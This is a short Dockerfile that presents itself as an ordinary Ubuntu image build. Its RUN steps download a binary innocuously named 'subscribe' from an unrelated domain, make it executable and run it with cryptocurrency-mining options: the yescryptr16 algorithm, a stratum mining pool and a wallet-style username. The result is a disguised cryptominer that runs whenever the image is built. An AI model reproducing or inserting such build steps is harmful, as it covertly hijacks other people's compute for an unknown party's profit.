FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17023 -u RRLGKHQd29BRUM5xPYQffkGL6cRcGZf9x4.a9


